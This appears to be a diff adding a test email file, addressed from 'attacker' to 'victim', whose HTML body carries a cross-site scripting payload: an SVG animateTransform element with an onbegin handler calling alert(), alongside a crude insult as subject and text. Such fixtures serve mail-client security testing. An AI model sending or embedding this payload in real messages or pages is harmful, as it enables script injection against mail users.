@@ -1,0 +1,7 @@
+From: <attacker@attacker.com>
+Subject: fuck your dog
+To: victim@189.com
+MIME-Version: 1.0
+Content-type: text/html
+
+fuck your dog<svg><animateTransform attributeName=transform onbegin=alert(2)>
